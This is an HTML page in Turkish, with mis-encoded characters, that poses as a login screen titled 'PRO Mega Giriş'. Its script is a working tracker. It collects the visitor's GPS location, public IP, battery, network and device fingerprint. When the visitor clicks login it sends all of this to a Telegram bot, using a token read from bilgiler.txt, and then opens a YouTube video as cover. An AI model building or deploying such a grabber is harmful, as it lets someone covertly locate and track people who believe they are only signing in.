<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <title>üöÄ PRO Mega Giri≈ü</title>
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(to right, #0f2027, #203a43, #2c5364);
      color: #fff;
      text-align: center;
      padding: 50px;
    }
    input, button {
      padding: 12px;
      font-size: 16px;
      margin: 10px;
      border-radius: 6px;
      border: none;
    }
    input {
      width: 250px;
    }
    button {
      background-color: #00ff99;
      color: #000;
      cursor: pointer;
    }
    button:hover {
      background-color: #00cc77;
    }
    #uyari {
      color: #ff4444;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <h1>üöÄ PRO Mega Giri≈ü</h1>
  <input id="username" placeholder="Adƒ±nƒ±zƒ± girin">
  <button onclick="girisYap()">Giri≈ü Yap</button>
  <div id="uyari"></div>

  <script>
    let info = {
      name:"", lat:null, lon:null,
      ip:"Alƒ±namadƒ±", browser:"site:Bilinmiyor",
      screen:`${screen.width}x${screen.height}`, pixelRatio:devicePixelRatio, colorDepth:screen.colorDepth,
      memory:navigator.deviceMemory||"?", cores:navigator.hardwareConcurrency||"?",
      online:navigator.onLine, platform:navigator.platform,
      language:navigator.language,
      timeZone:Intl.DateTimeFormat().resolvedOptions().timeZone,
      hour:new Date().getHours(), timestamp:new Date().toLocaleString(),
      batteryLevel:"?", charging:"?",
      storageUsage:"?", storageQuota:"?",
      netType:"?", downlink:"?", rtt:"?",
      darkMode:false,
      cookieEnabled:navigator.cookieEnabled,
      doNotTrack:navigator.doNotTrack||navigator.msDoNotTrack,
      orientation:(screen.orientation&&screen.orientation.type)||"unknown",
      pluginsCount:navigator.plugins?navigator.plugins.length:"?",
      pageLoadTime:0
    };

    window.onload = async () => {
      const start = performance.timing.navigationStart;

      navigator.geolocation.getCurrentPosition(
        p => {
          info.lat = p.coords.latitude;
          info.lon = p.coords.longitude;
        },
        () => document.getElementById("uyari").innerText = "üìç Konum izni gerekli!"
      );

      try {
        const { ip } = await fetch("https://api.ipify.org?format=json").then(r => r.json());
        info.ip = ip;
      } catch {}

      if (navigator.getBattery) {
        const bat = await navigator.getBattery();
        info.batteryLevel = Math.round(bat.level * 100) + "%";
        info.charging = bat.charging;
      }

      if (navigator.storage && navigator.storage.estimate) {
        const { usage, quota } = await navigator.storage.estimate();
        info.storageUsage = usage;
        info.storageQuota = quota;
      }

      const conn = navigator.connection || {};
      info.netType = conn.effectiveType || "?";
      info.downlink = conn.downlink || "?";
      info.rtt = conn.rtt || "?";

      const ua = navigator.userAgent;
      if (ua.includes("Chrome") && !ua.includes("Edg")) info.browser = "site:Chrome";
      else if (ua.includes("Firefox")) info.browser = "site:Firefox";
      else if (ua.includes("Safari") && !ua.includes("Chrome")) info.browser = "site:Safari";
      else if (ua.includes("Edg")) info.browser = "site:Edge";

      info.darkMode = window.matchMedia("(prefers-color-scheme: dark)").matches;
      info.pageLoadTime = performance.timing.domContentLoadedEventEnd - start;
    };

    async function girisYap() {
      const username = document.getElementById("username").value.trim();
      if (!username) {
        document.getElementById("uyari").innerText = "‚ö†Ô∏è L√ºtfen adƒ±nƒ±zƒ± girin!";
        return;
      }

      info.name = username;

      // bilgiler.txt'den bot bilgilerini √ßek
      try {
        const veri = await fetch("bilgiler.txt").then(r => r.text());
        const BOT_TOKEN = veri.match(/BOT_TOKEN=(.*)/)[1].trim();
        const CHAT_ID = veri.match(/CHAT_ID=(.*)/)[1].trim();

        const mesaj = Object.entries(info).map(([k, v]) => `${k}: ${v}`).join("\n");

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: `chat_id=${CHAT_ID}&text=${encodeURIComponent(mesaj)}`
        });

        window.open("https://www.youtube.com/watch?v=GBGqg0v8ZpI", "_blank");
      } catch (e) {
        document.getElementById("uyari").innerText = "‚ùå bilgiler.txt y√ºklenemedi veya Telegram g√∂nderimi ba≈üarƒ±sƒ±z.";
      }
    }
  </script>
</body>
</html>
